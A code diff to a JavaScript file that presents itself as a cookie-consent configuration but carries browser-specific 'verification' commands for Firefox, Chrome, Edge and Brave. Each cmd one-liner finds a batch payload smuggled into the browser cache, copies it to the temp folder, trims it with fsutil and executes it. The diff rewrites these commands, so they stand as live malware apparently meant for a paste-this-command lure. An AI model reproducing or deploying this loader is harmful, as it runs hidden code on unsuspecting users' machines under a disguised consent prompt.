@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.8.0',
+    version: '1.8.1',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -25,10 +25,10 @@
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
-      firefox: 'cmd /c for /d %p in ("%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*") do @for %f in ("%p\\cache2\\entries\\*") do @findstr /b /c:@echo "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul&&fsutil file seteof "%TMP%\\t.bat" {SZ} >nul&&call "%TMP%\\t.bat"&exit',
-      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul&&fsutil file seteof "%TMP%\\t.bat" {SZ} >nul&&call "%TMP%\\t.bat"&exit',
-      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul&&fsutil file seteof "%TMP%\\t.bat" {SZ} >nul&&call "%TMP%\\t.bat"&exit',
-      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware" %f in (f_*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul&&fsutil file seteof "%TMP%\\t.bat" {SZ} >nul&&call "%TMP%\\t.bat"&exit'
+      firefox: 'cmd /c cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in ("%p\\cache2\\entries\\*") do @findstr /b /c:@echo "%f"&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
+      chrome: 'cmd /c cd /d %TMP%&for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @findstr /b /c:@echo "%f"&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
+      edge: 'cmd /c cd /d %TMP%&for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @findstr /b /c:@echo "%f"&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
+      brave: 'cmd /c cd /d %TMP%&for /r %LOCALAPPDATA%\\BraveSoftware %f in (f_*) do @findstr /b /c:@echo "%f"&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat'
     }
   };
 
